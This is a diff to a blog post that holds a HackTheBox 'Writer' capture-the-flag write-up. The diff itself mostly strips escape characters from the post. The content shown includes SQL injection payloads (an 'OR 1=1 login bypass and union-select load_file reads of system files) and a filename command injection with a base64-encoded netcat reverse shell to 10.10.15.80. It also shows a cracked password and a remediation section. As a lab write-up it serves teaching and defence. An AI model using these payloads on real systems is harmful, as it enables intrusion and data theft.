@@ -7,9 +7,9 @@ image:  '/images/0xd4y-logo-gray.png'
 tags:   [SQLi, SMTP, RCE, APT]
 ---
 
-**This report can be read both on this site, and as its <a href = "https://zezul.github.io/reports/Writer%20Writeup.pdf">original report form</a>. It is highly recommended that you read the PDF instead because it is better formatted.**
+**This report can be read both on this site, and as its <a href = "https://zezul.github.io/reports/Writer%20Writeup.pdf">original report form</a>. It is highly recommended that you read the original report form instead because it is better formatted.**
 
-![](images/test/image3.png)
+![](/images/test/image3.png)
 
 LinkedIn: [https://www.linkedin.com/in/segev-eliezer/](https://www.google.com/url?q=https://www.linkedin.com/in/segev-eliezer/&sa=D&source=editors&ust=1653773864786089&usg=AOvVaw02OXACudSej5nWLBZ4W3Vk) 
 
@@ -79,7 +79,7 @@ Enumeration
 To examine potential vulnerabilities, the ports of the target were first scanned:
 
 {% highlight bash %}
-\# Nmap 7.91 scan initiated Tue Aug 17 14:52:04 2021 as: nmap -sC -sV -oA nmap/nmap 10.10.11.101  
+# Nmap 7.91 scan initiated Tue Aug 17 14:52:04 2021 as: nmap -sC -sV -oA nmap/nmap 10.10.11.101  
 Nmap scan report for 10.10.11.101  
 Host is up (0.065s latency).  
 Not shown: 996 closed ports  
@@ -88,31 +88,31 @@ PORT    STATE SERVICE     VERSION
 | ssh-hostkey:  
 |   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)  
 |   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)  
-|\_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)  
+|_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)  
 80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))  
-|\_http-server-header: Apache/2.4.41 (Ubuntu)  
-|\_http-title: Story Bank | Writer.HTB  
+|_http-server-header: Apache/2.4.41 (Ubuntu)  
+|_http-title: Story Bank | Writer.HTB  
 139/tcp open  netbios-ssn Samba smbd 4.6.2  
 445/tcp open  netbios-ssn Samba smbd 4.6.2  
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel  
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
   
 Host script results:  
-|\_clock-skew: 32s  
-|\_nbstat: NetBIOS name: WRITER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)  
+|_clock-skew: 32s  
+|_nbstat: NetBIOS name: WRITER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)  
 | smb2-security-mode:  
 |   2.02:  
-|\_    Message signing enabled but not required  
+|_    Message signing enabled but not required  
 | smb2-time:  
 |   date: 2021-08-17T19:52:51  
-|\_  start\_date: N/A  
+|_  start_date: N/A  
   
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
-\# Nmap done at Tue Aug 17 14:52:20 2021 -- 1 IP address (1 host up) scanned in 15.70 seconds
+# Nmap done at Tue Aug 17 14:52:20 2021 -- 1 IP address (1 host up) scanned in 15.70 seconds
 {% endhighlight %}
 
 From the nmap scan, it is apparent that the SSH, HTTP, and SMB services are running on the target.  The SMB service is of interest, however there is no anonymous access to any of the shares:
 
-![](images/test/image1.png)
+![](/images/test/image1.png)
 
 Seeing as all of the services are up to date, it follows that the HTTP service must be searched for potential vulnerabilities.
 
@@ -120,7 +120,7 @@ Seeing as all of the services are up to date, it follows that the HTTP service m
 
 Users visiting the target’s web server are met with the following home page:
 
-![](images/test/image4.png)
+![](/images/test/image4.png)
 
 Enumerating the directories of the webpage with gobuster[\[1\]](#ftnt1), the following directories are found:
 
@@ -137,7 +137,7 @@ Enumerating the directories of the webpage with gobuster[\[1\]](#ftnt1), the fol
 
 A directory of particular interest is /administrative, especially since it cannot be found without brute forcing directories. Visiting this directory reveals a simple login form which asks for a username and password:
 
-![](images/test/image2.png)
+![](/images/test/image2.png)
 
 Note the domain of the target (namely writer.htb). However, no virtual host routing is present.
 
@@ -146,7 +146,7 @@ SQL Injection
 
 When inputting ’OR 1=1-- - as the username and choosing a random value for the password, the user is automatically authenticated, thus confirming the presence of SQL injection. As an authenticated user, stories can be edited and created, and pictures can be uploaded:
 
-![](images/test/image5.png)
+![](/images/test/image5.png)
 
 The web page does not properly check if an uploaded file is an image, as it was possible to upload a reverse shell by the name of php-reverse-shell.jpg.php. This, however, did not lead to RCE as the web page nevertheless treated the file as an image. Furthermore, uploading a malicious image with PHP code did not work.
 
@@ -188,7 +188,7 @@ Content-Type: application/octet-stream
   
   
 \-----------------------------12417370376638841362770592069  
-Content-Disposition: form-data; name\="image\_url"  
+Content-Disposition: form-data; name\="image_url"  
   
 http://10.10.15.80/image.jpg  
 \-----------------------------12417370376638841362770592069  
@@ -196,7 +196,7 @@ Content-Disposition: form-data; name\="content"Thanks for reading!
 \-----------------------------12417370376638841362770592069--
 {% endhighlight %}
 
-Note the “image\_url” parameter highlighted in red  
+Note the “image_url” parameter highlighted in red  
 
 Response
 
@@ -214,12 +214,12 @@ Judging from the user-agent, it was found that the server is running python. Aft
 
 ### Leveraging SQLi to Read Local Files
 
-This is possible via the load\_file SQL function. Going back to the login page, this function can be used in conjunction with a union select statement to leak files:
+This is possible via the load_file SQL function. Going back to the login page, this function can be used in conjunction with a union select statement to leak files:
 
 Payload
 
 {% highlight bash %}
-uname='union select 1,load\_file('/etc/passwd'),3,4,5,6-- -&password=a
+uname='union select 1,load_file('/etc/passwd'),3,4,5,6-- -&password=a
 {% endhighlight %}
 
 Response
@@ -248,7 +248,7 @@ systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
 systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin  
 messagebus:x:103:106::/nonexistent:/usr/sbin/nologin  
 syslog:x:104:110::/home/syslog:/usr/sbin/nologin  
-\_apt:x:105:65534::/nonexistent:/usr/sbin/nologin  
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin  
 tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false  
 uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin  
 tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin  
@@ -275,7 +275,7 @@ Before being able to read the source code of the website, the full path of the f
 Payload
 
 {% highlight bash %}
-uname='union select 1,load\_file('/etc/apache2/sites-available/000-default.conf'),3,4,5,6-- -&password=a
+uname='union select 1,load_file('/etc/apache2/sites-available/000-default.conf'),3,4,5,6-- -&password=a
 {% endhighlight %}
 
   
@@ -294,57 +294,57 @@ Welcome # Virtual host configuration for writer.htb domain
                Order allow,deny  
                Allow from all  
        &lt;/Directory&gt;  
-       ErrorLog ${APACHE\_LOG\_DIR}/error.log  
+       ErrorLog ${APACHE_LOG_DIR}/error.log  
        LogLevel warn  
-       CustomLog ${APACHE\_LOG\_DIR}/access.log combined  
+       CustomLog ${APACHE_LOG_DIR}/access.log combined  
 &lt;/VirtualHost&gt;  
   
-\# Virtual host configuration for dev.writer.htb subdomain  
-\# Will enable configuration after completing backend development  
-\# Listen 8080  
+# Virtual host configuration for dev.writer.htb subdomain  
+# Will enable configuration after completing backend development  
+# Listen 8080  
 #&lt;VirtualHost 127.0.0.1:8080&gt;  
 #        ServerName dev.writer.htb  
 #        ServerAdmin admin@writer.htb  
-#       # Collect static for the writer2\_project/writer\_web/templates#        Alias /static /var/www/writer2\_project/static  
-#        &lt;Directory /var/www/writer2\_project/static&gt;  
+#       # Collect static for the writer2_project/writer_web/templates#        Alias /static /var/www/writer2_project/static  
+#        &lt;Directory /var/www/writer2_project/static&gt;  
 #                Require all granted  
 #        &lt;/Directory&gt;  
 #  
-#        &lt;Directory /var/www/writer2\_project/writerv2&gt;  
+#        &lt;Directory /var/www/writer2_project/writerv2&gt;  
 #                &lt;Files wsgi.py&gt;  
 #                        Require all granted  
 #                &lt;/Files&gt;  
 #        &lt;/Directory&gt;  
 #  
-#        WSGIDaemonProcess writer2\_project python-path=/var/www/writer2\_project python-home=/var/www/writer2\_project/writer2env  
-#        WSGIProcessGroup writer2\_project  
-#        WSGIScriptAlias / /var/www/writer2\_project/writerv2/wsgi.py  
-\#        ErrorLog ${APACHE\_LOG\_DIR}/error.log  
-\#        LogLevel warn  
-\#        CustomLog ${APACHE\_LOG\_DIR}/access.log combined  
+#        WSGIDaemonProcess writer2_project python-path=/var/www/writer2_project python-home=/var/www/writer2_project/writer2env  
+#        WSGIProcessGroup writer2_project  
+#        WSGIScriptAlias / /var/www/writer2_project/writerv2/wsgi.py  
+#        ErrorLog ${APACHE_LOG_DIR}/error.log  
+#        LogLevel warn  
+#        CustomLog ${APACHE_LOG_DIR}/access.log combined  
 #  
 #&lt;/VirtualHost&gt;  
-\# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
+# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
 {% endhighlight %}
 
-In particular, note the directory in which the writer.wsgi file lies in (highlighted in blue). After finding out that the server is running python, fuzzing for files in the root of the web server revealed an \_\_init\_\_.py file within /var/www/writer.htb/writer/. Leaking this file reveals the following contents:
+In particular, note the directory in which the writer.wsgi file lies in (highlighted in blue). After finding out that the server is running python, fuzzing for files in the root of the web server revealed an __init__.py file within /var/www/writer.htb/writer/. Leaking this file reveals the following contents:
 
 {% highlight python %}
 if request.method == "POST":        if request.files\['image'\]:             image = request.files\['image'\]            if ".jpg" in image.filename:  
-                path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)               image.save(path)$               image = "/img/{}".format(image.filename)           else:$               error = "File extensions must be in .jpg!"               return render\_template('add.html', error\=error)       if request.form.get('image\_url'):  
-           image\_url = request.form.get('image\_url')           if ".jpg" in image\_url:               try:                   local\_filename, headers = urllib.request.urlretrieve(image\_url)  
-                   os.system("mv {} {}.jpg".format(local\_filename, local\_filename))                   image = "{}.jpg".format(local\_filename)                   try:                       im = Image.open(image)                       im.verify()                       im.close()  
+                path = os.path.join('/var/www/writer.htb/writer/static/img/', image.filename)               image.save(path)$               image = "/img/{}".format(image.filename)           else:$               error = "File extensions must be in .jpg!"               return render_template('add.html', error\=error)       if request.form.get('image_url'):  
+           image_url = request.form.get('image_url')           if ".jpg" in image_url:               try:                   local_filename, headers = urllib.request.urlretrieve(image_url)  
+                   os.system("mv {} {}.jpg".format(local_filename, local_filename))                   image = "{}.jpg".format(local_filename)                   try:                       im = Image.open(image)                       im.verify()                       im.close()  
                        image = image.replace('/tmp/','')                      os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))                       image = "/img/{}".format(image)  
                    except PIL.UnidentifiedImageError:                       os.system("rm {}".format(image))                       error = "Not a valid image file!"...  
 
-        if request.form.get('image\_url'):  
-           image\_url = request.form.get('image\_url')           if ".jpg" in image\_url:               try:  
-                   local\_filename, headers = urllib.request.urlretrieve(image\_url)                   os.system("mv {} {}.jpg".format(local\_filename, local\_filename))                   image = "{}.jpg".format(local\_filename)                   try:                       im = Image.open(image)                       im.verify()                       im.close()  
+        if request.form.get('image_url'):  
+           image_url = request.form.get('image_url')           if ".jpg" in image_url:               try:  
+                   local_filename, headers = urllib.request.urlretrieve(image_url)                   os.system("mv {} {}.jpg".format(local_filename, local_filename))                   image = "{}.jpg".format(local_filename)                   try:                       im = Image.open(image)                       im.verify()                       im.close()  
                        image = image.replace('/tmp/','')                       os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))                       image = "/img/{}".format(image)                       cursor = connector.cursor()                       cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image':image, 'id':id})  
                        result = connector.commit()  
   
-                   except PIL.UnidentifiedImageError:                       os.system("rm {}".format(image))                       error = "Not a valid image file!"                       return render\_template('edit.html', error=error, results=results, id=id)  
-               except:                   error = "Issue uploading picture"                   return render\_template('edit.html', error=error, results=results, id=id)           else:  
+                   except PIL.UnidentifiedImageError:                       os.system("rm {}".format(image))                       error = "Not a valid image file!"                       return render_template('edit.html', error=error, results=results, id=id)  
+               except:                   error = "Issue uploading picture"                   return render_template('edit.html', error=error, results=results, id=id)           else:  
                error = "File extensions must be in .jpg!"
 {% endhighlight %}
 
@@ -361,9 +361,9 @@ import urllib
 import os  
 from flask import request  
   
-local\_filename, headers = urllib.request.urlretrieve('http://10.10.15.80/.jpg/1.jpg;sleep')  
-print("The local\_filename is", local\_filename)  
-os.system("mv {} {}.jpg".format(local\_filename, local\_filename))
+local_filename, headers = urllib.request.urlretrieve('http://10.10.15.80/.jpg/1.jpg;sleep')  
+print("The local_filename is", local_filename)  
+os.system("mv {} {}.jpg".format(local_filename, local_filename))
 {% endhighlight %}
 
 Observe the argument of the urllib.request.urlretrieve() function. The user is in control of this argument. If a user were to upload a file called 1.jpg;sleep, then the server will behave accordingly:
@@ -371,13 +371,13 @@ Observe the argument of the urllib.request.urlretrieve() function. The user is 
   
 Response
 
-The local\_filename is /tmp/tmpen3ya1q1
+The local_filename is /tmp/tmpen3ya1q1
 
 However, when changing the argument to be file:///home/0xd4y/business/hackthebox/medium/linux/writer/www/.jpg/1.jpg;sleep 10, then command execution is performed. This works because the urllib function does not correctly rename the file to something safe in the instance that the argument is using the file protocol. Therefore, a file with a malicious name can be uploaded using the image parameter, and this file can then be referenced locally via the file protocol.
 
 ### Reverse Shell
 
-After uploading a file with the name \`0xd4y.jpg;echo -n cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTUuODAgOTAwMSA+L3RtcC9m|base64 -d|bash\`, it was referenced locally by putting the following in the image\_url parameter: file:///var/www/writer.htb/writer/static/img/0xd4y.jpg;\`echo -n cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTUuODAgOTAwMSA+L3RtcC9m|base64 -d|bash\`. A reverse shell was then returned as the www-data user:
+After uploading a file with the name \`0xd4y.jpg;echo -n cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTUuODAgOTAwMSA+L3RtcC9m|base64 -d|bash\`, it was referenced locally by putting the following in the image_url parameter: file:///var/www/writer.htb/writer/static/img/0xd4y.jpg;\`echo -n cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTUuODAgOTAwMSA+L3RtcC9m|base64 -d|bash\`. A reverse shell was then returned as the www-data user:
 
 {% highlight bash %}
 ┌─\[✗\]─\[0xd4y@Writeup\]─\[~/business/hackthebox/medium/linux/writer\]└──╼ $nc -lvnp 9001  
@@ -400,7 +400,7 @@ password = DjangoSuperPassword
 
 One of Kyle’s passwords is located in the databases, albeit it is hashed:
 
-pbkdf2\_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=. Cracking this hash reveals that Kyle’s password is marcoantonio.
+pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=. Cracking this hash reveals that Kyle’s password is marcoantonio.
 
 ### John
 
@@ -450,7 +450,7 @@ When the cronjob runs again, a reverse shell is returned as the root user:
 listening on \[any\] 9001 ...  
 connect to \[10.10.15.80\] from (UNKNOWN) \[10.10.11.101\] 56068  
 /bin/sh: 0: can't access tty; job control turned off  
-\# whoami  
+# whoami  
 root
 {% endhighlight %}
 
@@ -477,7 +477,7 @@ This insecure SQL statement allows an attacker to add a single quote in their us
   
 try {  
   
- $conn = new PDO("mysql:host=$servername;dbname=$dbname", $db\_username, $db\_password); // set the PDO error mode to exception $conn->setAttribute(PDO::ATTR\_ERRMODE, PDO::ERRMODE\_EXCEPTION); // prepare sql and bind parameters        $query = "INSERT INTO users (username,password)  VALUES(:username,:password)";  
+ $conn = new PDO("mysql:host=$servername;dbname=$dbname", $db_username, $db_password); // set the PDO error mode to exception $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); // prepare sql and bind parameters        $query = "INSERT INTO users (username,password)  VALUES(:username,:password)";  
         $statement = $conn->prepare($query);  
         $statement->execute(array(   ':username'\=> $username,   ':password'\=> $password  
         ));  
@@ -495,16 +495,17 @@ Image Upload (RCE)
 After successfully performing an SQL injection attack, an upload feature in the webpage was exploited to gain RCE due to insecure python code. System commands and evaluation functions should never be performed on user input. As discussed in [Finding RCE Vulnerability](#h.eswqky3qu6hx), the system() function in the os module was the reason for the critical RCE vulnerability. The following code prevents this vulnerability:
 
 {% highlight python %}
-from werkzeug.utils import secure\_filename
+from werkzeug.utils import secure_filename
 
 from PIL import Image  
   
 filename = request.file('image')  
   
 image = StringIO(base64.b64decode(download\['file'\]))  
-allowed\_extensions = \['jpg','jpeg'\]  
-if filename.split('.')\[-1\] in allowed\_extensions:        try:  
-                filename = secure\_filename(filename)  
+allowed_extensions = \['jpg','jpeg'\]  
+if filename.split('.')\[-1\] in allowed_extensions:        
+				try:  
+                filename = secure_filename(filename)  
   
                 img = Image.open(image)  
                 img.verify()  
